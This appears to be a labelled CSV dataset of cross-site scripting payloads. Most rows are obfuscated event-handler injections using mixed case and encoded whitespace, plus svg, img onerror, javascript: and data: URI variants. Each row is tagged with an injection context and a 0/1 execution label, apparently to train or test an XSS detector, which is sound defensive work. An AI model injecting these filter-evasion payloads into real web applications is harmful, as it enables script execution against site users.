payload,context,exec,combined
</pre><details open ontoggle=alert(1)>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag </pre><details open ontoggle=alert(1)>
"<A%09OnmoUSeoVER%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%09OnmoUSeoVER%09=%09a=prompt,a()>v3dm0s"
"<a%09OnpointEReNtEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%09OnpointEReNtEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<HTML%0aOnpOInTEreNteR+=+confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTML%0aOnpOInTEreNteR+=+confirm()%0dx>
<D3V%0aonpOInTerENtEr%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aonpOInTerENtEr%0a=%0a(prompt)``%0dx>v3dm0s
"<D3v%0aOnMoUSEOver%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3v%0aOnMoUSEOver%0a=%0aa=prompt,a()%0dx>v3dm0s"
<hTmL%09oNpoINtErEntEr%0a=%0a(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTmL%09oNpoINtErEntEr%0a=%0a(prompt)``//
<D3V%09onPoiNTERenTeR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09onPoiNTERenTeR%0a=%0a[8].find(confirm)>v3dm0s
<htMl%0dOnMoUSEOvEr%0a=%0a(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htMl%0dOnMoUSEOvEr%0a=%0a(prompt)``%0dx//
<htMl/+/onMOUSeOvEr%0d=%0d(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htMl/+/onMOUSeOvEr%0d=%0d(prompt)``%0dx//
<d3V%09ONmousEOVeR%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09ONmousEOVeR%0d=%0dconfirm()>v3dm0s
<a%09OnMOuSEover+=+(prompt)``%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%09OnMOuSEover+=+(prompt)``%0dx>v3dm0s
<a%0aONpOinTEreNTer+=+(prompt)``%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aONpOinTEreNTer+=+(prompt)``%0dx>v3dm0s
<a%0donMouSEoVeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0donMouSEoVeR%0a=%0aconfirm()>v3dm0s
javascript:confirm(1),url_navigation,1,CTX_url_navigation CTX_url_navigation CTX_url_navigation javascript:confirm(1)
"<A/+/ONPOiNTErEnTER%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A/+/ONPOiNTErEnTER%09=%09a=prompt,a()%0dx>v3dm0s"
"<hTMl%0dONmOuSEOveR+=+a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <hTMl%0dONmOuSEOveR+=+a=prompt,a()>"
<detAILS%0dONTOgglE%09=%09confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detAILS%0dONTOgglE%09=%09confirm()>
"data:text/html,<script>alert(document.domain)</script>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag data:text/html,<script>alert(document.domain)</script>"
<a%0aoNPOiNTERENTeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aoNPOiNTERENTeR%09=%09[8].find(confirm)%0dx>v3dm0s
<HTmL%09OnPOINTErEnter%09=%09[8].find(confirm)//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTmL%09OnPOINTErEnter%09=%09[8].find(confirm)//
<a%0dOnMoUSeoVer%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dOnMoUSeoVer%09=%09confirm()%0dx>v3dm0s
<a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s
<DeTAILS/+/OnPOINTeREnTER%0a=%0aconfirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTAILS/+/OnPOINTeREnTER%0a=%0aconfirm()>
"<a%0aonMOUsEOVeR%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0aonMOUsEOVeR%09=%09a=prompt,a()>v3dm0s"
<D3v%0aOnpoiNtErENTeR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0aOnpoiNtErENTeR%0d=%0d[8].find(confirm)%0dx>v3dm0s
<detAIlS/+/OntoGGle%09=%09(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAIlS/+/OntoGGle%09=%09(prompt)``//
<D3v%0aOnPoINtEReNTER%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnPoINtEReNTER%0d=%0d(prompt)``%0dx>v3dm0s
<body>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <body>
<detAILs%0doNpoInTErENtER+=+confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAILs%0doNpoInTErENtER+=+confirm()%0dx>
<htmL%0aONMOuSeoVeR%0a=%0aconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htmL%0aONMOuSeoVeR%0a=%0aconfirm()%0dx//
<d3v%0aONMOusEovER%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0aONMOusEovER%09=%09[8].find(confirm)%0dx>v3dm0s
<d3V%0dOnpOiNTeREnter%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dOnpOiNTeREnter%09=%09[8].find(confirm)%0dx>v3dm0s
<dEtaILS%0aoNPoiNtEReNTEr+=+confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtaILS%0aoNPoiNtEReNTEr+=+confirm()%0dx>
<a%0dONPOINtErEnTER%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dONPOINtErEnTER%09=%09confirm()>v3dm0s
%3Cimg%3E,html_text,0,CTX_html_text CTX_html_text CTX_html_text %3Cimg%3E
<a%09OnMoUSeOver%0a=%0a(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09OnMoUSeOver%0a=%0a(prompt)``>v3dm0s
"<a%0dONPoInTeREntER%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%0dONPoInTeREntER%0d=%0da=prompt,a()>v3dm0s"
<A/+/OnPoINterENTer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/OnPoINterENTer%0d=%0d[8].find(confirm)%0dx>v3dm0s
<D3v/+/OnmOUseovER%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v/+/OnmOUseovER%09=%09[8].find(confirm)%0dx>v3dm0s
<d3v%0doNPOInTERENTeR%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0doNPOInTERENTeR%0d=%0d(confirm)()%0dx>v3dm0s
<deTailS%09ONTOggLe%09=%09(prompt)``>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTailS%09ONTOggLe%09=%09(prompt)``>
<a%0aOnMOuSEoVEr%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aOnMOuSEoVEr%0a=%0a(confirm)()%0dx>v3dm0s
<D3v/+/onPOinTEreNtER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/onPOinTEreNtER%0d=%0d[8].find(confirm)%0dx>v3dm0s
<a%0aONpoIntERenteR%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aONpoIntERenteR%0d=%0d(confirm)()%0dx>v3dm0s
<D3v%09OnmOUSeOvEr%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%09OnmOUSeOvEr%0d=%0dconfirm()>v3dm0s
<D3V%0aOnMOuSeOVEr%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aOnMOuSeOVEr%09=%09(confirm)()%0dx>v3dm0s
<D3V%0aoNMOuSEOvEr%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aoNMOuSEOvEr%09=%09(prompt)``>v3dm0s
<a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<htML/+/ONPoiNTeReNTEr%0a=%0a(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htML/+/ONPoiNTeReNTEr%0a=%0a(confirm)()>
<A/+/ONPointerenTeR%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/ONPointerenTeR%09=%09(confirm)()%0dx>v3dm0s
<htMl%0aoNPoINtErENter+=+(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htMl%0aoNPoINtErENter+=+(prompt)``%0dx>
<D3v%0aOnmouseoVer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0aOnmouseoVer%0d=%0dconfirm()%0dx>v3dm0s
<d3V/+/oNMOUSEOVeR%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/oNMOUSEOVeR%09=%09confirm()%0dx>v3dm0s
<a/+/OnPOINteRENtEr%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnPOINteRENtEr%0a=%0a(confirm)()%0dx>v3dm0s
<D3v/+/ONMoUsEOver%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/ONMoUsEOver%0d=%0d[8].find(confirm)%0dx>v3dm0s
<dETaiLS%0dONpoiNTEreNTeR%0d=%0dconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETaiLS%0dONpoiNTEreNTeR%0d=%0dconfirm()>
<D3v%0dONmoUsEoVER%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0dONmoUsEoVER%0a=%0aconfirm()>v3dm0s
<D3v%09ONPoiNTeRenter+=+(prompt)``>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09ONPoiNTeRenter+=+(prompt)``>v3dm0s
<D3v%0dONPoInTeRENtEr+=+confirm()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3v%0dONPoInTeRENtEr+=+confirm()%0dx>v3dm0s
<d3V/+/oNmOUseOVeR%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/oNmOUseOVeR%0d=%0d(confirm)()>v3dm0s
<D3V%0aONpoiNTErENTEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aONpoiNTErENTEr%0d=%0dconfirm()>v3dm0s
<D3V%09onMoUSeOvER%0a=%0a(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09onMoUSeOvER%0a=%0a(confirm)()>v3dm0s
<d3V%0donPOiNtErENteR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0donPOiNtErENteR%0d=%0d[8].find(confirm)%0dx>v3dm0s
<A/+/OnpoiNtEreNTeR+=+confirm()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A/+/OnpoiNtEreNTeR+=+confirm()%0dx>v3dm0s
<DEtaIlS%0aOntoGglE+=+[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtaIlS%0aOntoGglE+=+[8].find(confirm)%0dx>
<DEtAIls%0aOnPOInTErEnteR%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtAIls%0aOnPOInTErEnteR%0a=%0aconfirm()%0dx//
<detAIlS%0aOnPoiNtEreNTer%0a=%0aconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detAIlS%0aOnPoiNtEreNTer%0a=%0aconfirm()%0dx>
javascript:alert(String.fromCharCode(49)),html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag javascript:alert(String.fromCharCode(49))
<Html%0dOnPOINTerENTER%09=%09confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <Html%0dOnPOINTerENTER%09=%09confirm()//
<D3V/+/ONmousEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/ONmousEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s
<HTmL%0dONmOuSEOveR%0a=%0aconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTmL%0dONmOuSEOveR%0a=%0aconfirm()%0dx>
<DEtailS%09oNpOINTerEnter%0d=%0d(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtailS%09oNpOINTerEnter%0d=%0d(confirm)()>
<D3v%0aOnPoInTERenter%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnPoInTERenter%0d=%0d(prompt)``>v3dm0s
<HtmL%0aonpoINTeREntER%09=%09[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%0aonpoINTeREntER%09=%09[8].find(confirm)%0dx//
"<D3v%0donmouSeOveR%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0donmouSeOveR%0d=%0da=prompt,a()>v3dm0s"
"<d3V%0dOnpOiNTerEnter+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <d3V%0dOnpOiNTerEnter+=+a=prompt,a()%0dx>v3dm0s"
<HTMl%09oNmouSeOVEr+=+(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTMl%09oNmouSeOVEr+=+(confirm)()%0dx//
<D3V%09onmouseOvER%0a=%0a(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09onmouseOvER%0a=%0a(prompt)``>v3dm0s
<a%09OnMOUSEOveR%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09OnMOUSEOveR%0d=%0d(prompt)``%0dx>v3dm0s
<HtmL%0aonmOuseOVer%0a=%0aconfirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%0aonmOuseOVer%0a=%0aconfirm()//
<a/+/oNPOiNtERENTEr%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/oNPOiNtERENTEr%0a=%0a[8].find(confirm)>v3dm0s
<HTMl%0dOnmoUsEover%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTMl%0dOnmoUsEover%0a=%0aconfirm()%0dx//
<A%09oNMOuSeoVeR%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09oNMOuSeoVeR%09=%09(prompt)``>v3dm0s
<A%0aONPOiNtereNTeR%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aONPOiNtereNTeR%0a=%0aconfirm()%0dx>v3dm0s
"<D3V%0doNMoUSEOveR+=+a=prompt,a()>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0doNMoUSEOveR+=+a=prompt,a()>v3dm0s"
"<dETAils%0dontOGGle%09=%09a=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dETAils%0dontOGGle%09=%09a=prompt,a()//"
<A%09ONmOUSEovER+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%09ONmOUSEovER+=+confirm()>v3dm0s
"<A/+/oNmouseovER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNmouseovER%0a=%0aa=prompt,a()%0dx>v3dm0s"
<a%09OnMoUSeOver%0a=%0a(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09OnMoUSeOver%0a=%0a(prompt)``>v3dm0s
<D3v%0aONmOusEover+=+(confirm)()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aONmOusEover+=+(confirm)()>v3dm0s
<A/+/ONPoINTEreNTeR%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/ONPoINTEreNTeR%09=%09confirm()>v3dm0s
<d3V/+/onMOusEover%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/onMOusEover%0d=%0d(prompt)``%0dx>v3dm0s
hello<script,html_text,0,CTX_html_text CTX_html_text CTX_html_text hello<script
"<a%0dONPoInTeREntER%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0dONPoInTeREntER%0d=%0da=prompt,a()>v3dm0s"
<D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<html%0dONMOUSEOver%0d=%0d[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <html%0dONMOUSEOver%0d=%0d[8].find(confirm)%0dx>
<A/+/ONPointEreNTer+=+(confirm)()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A/+/ONPointEreNTer+=+(confirm)()%0dx>v3dm0s
"<A%09OnMoUSeOVEr%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%09OnMoUSeOVEr%09=%09a=prompt,a()>v3dm0s"
"<A/+/OnPOIntEREntER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A/+/OnPOIntEREntER%09=%09a=prompt,a()>v3dm0s"
<D3V%0donmOuSeOveR%09=%09(prompt)``>v3dm0s,url_href,0,CTX_url_href CTX_url_href CTX_url_href <D3V%0donmOuSeOveR%09=%09(prompt)``>v3dm0s
<svg onload=alert(location)>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <svg onload=alert(location)>
<d3V%09ONPOiNTEReNtEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09ONPOiNTEReNtEr%09=%09confirm()%0dx>v3dm0s
<detaIls%0dontoggLe%09=%09confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detaIls%0dontoggLe%09=%09confirm()//
<a%0aONpoInteRENTER%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aONpoInteRENTER%09=%09(confirm)()>v3dm0s
<DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>
<a%0dONmOuSEoVeR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dONmOuSEoVeR%09=%09confirm()>v3dm0s
<A%0aOnPOInTErENteR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aOnPOInTErENteR%0d=%0d(prompt)``>v3dm0s
<D3V%09onmouseOvER%0a=%0a(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09onmouseOvER%0a=%0a(prompt)``>v3dm0s
<HTml/+/oNmOuSeoVEr%09=%09confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTml/+/oNmOuSeoVEr%09=%09confirm()//
"<a%09OnpointEReNtEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%09OnpointEReNtEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<a%0aONMOusEoVEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aONMOusEoVEr%0a=%0aconfirm()%0dx>v3dm0s
<DEtaIlS%0aoNTogglE%09=%09confirm()%0dx>,html_text,1,CTX_html_text CTX_html_text CTX_html_text <DEtaIlS%0aoNTogglE%09=%09confirm()%0dx>
"<a%0aOnPointeREnTeR%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%0aOnPointeREnTeR%0d=%0da=prompt,a()%0dx>v3dm0s"
<a%09ONmouseOvEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09ONmouseOvEr%0d=%0d[8].find(confirm)>v3dm0s
<D3V%09oNmOUseoVeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09oNmOUseoVeR%0a=%0aconfirm()>v3dm0s
"""><svg/onload=alert(1)>",html_attribute,1,"CTX_html_attribute CTX_html_attribute CTX_html_attribute ""><svg/onload=alert(1)>"
<HTmL%09OnmouSeOVEr+=+[8].find(confirm)//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTmL%09OnmouSeOVEr+=+[8].find(confirm)//
<d3V/+/oNmoUseoVer%0a=%0a(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/oNmoUseoVer%0a=%0a(confirm)()>v3dm0s
<d3V%0doNmousEOVER+=+confirm()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <d3V%0doNmousEOVER+=+confirm()>v3dm0s
<HTMl%0aOnMoUSeOver%09=%09(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTMl%0aOnMoUSeOver%09=%09(confirm)()>
</textarea><svg/onload=alert(1)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text </textarea><svg/onload=alert(1)>
</pre><marquee onmouseover=alert(1)>hover me</marquee,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag </pre><marquee onmouseover=alert(1)>hover me</marquee
<script>alert(1),html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <script>alert(1)
<D3v%09OnpOiNTerEnTer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09OnpOiNTerEnTer%0d=%0d[8].find(confirm)%0dx>v3dm0s
<detAILs%09onpOiNtereNteR%09=%09[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAILs%09onpOiNtereNteR%09=%09[8].find(confirm)>
<A%09OnMOuSeover%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09OnMOuSeover%09=%09(confirm)()%0dx>v3dm0s
<a%0dOnpointerenTEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dOnpointerenTEr%0d=%0d(prompt)``%0dx>v3dm0s
<D3V%09ONpOINterEnteR%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09ONpOINterEnteR%0d=%0d(confirm)()%0dx>v3dm0s
<DEtAiLS/+/ontOgGLe%0a=%0a(prompt)``>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtAiLS/+/ontOgGLe%0a=%0a(prompt)``>
id=123,html_text,0,CTX_html_text CTX_html_text CTX_html_text id=123
<A%0aoNMousEover%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aoNMousEover%0d=%0dconfirm()%0dx>v3dm0s
"data:text/html,<img src=x onerror=alert(1)>",url_navigation,1,"CTX_url_navigation CTX_url_navigation CTX_url_navigation data:text/html,<img src=x onerror=alert(1)>"
<a%0aonPoIntERENter%0a=%0a(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aonPoIntERENter%0a=%0a(prompt)``>v3dm0s
<d3v%0aonmOusEOVEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0aonmOusEOVEr%0d=%0d[8].find(confirm)>v3dm0s
<img src=x onerror=alert&#x28;1&#x29;>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <img src=x onerror=alert&#x28;1&#x29;>
"<D3V%09OnmoUseOVer%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3V%09OnmoUseOVer%0a=%0aa=prompt,a()%0dx>v3dm0s"
<D3V%09OnPoINTEREnteR%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09OnPoINTEREnteR%09=%09(confirm)()%0dx>v3dm0s
<a/+/oNMousEoVeR%09=%09(prompt)``%0dx>v3dm0s,script_block,0,CTX_script_block CTX_script_block CTX_script_block <a/+/oNMousEoVeR%09=%09(prompt)``%0dx>v3dm0s
<HTmL%0doNPoinTErENtER%0d=%0dconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTmL%0doNPoinTErENtER%0d=%0dconfirm()%0dx>
<HTMl%09ONpOinterEntER+=+(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTMl%09ONpOinterEntER+=+(confirm)()//
<meter onmouseover=alert(1)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <meter onmouseover=alert(1)>
<img src=x onerror=alert(navigator.userAgent)>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <img src=x onerror=alert(navigator.userAgent)>
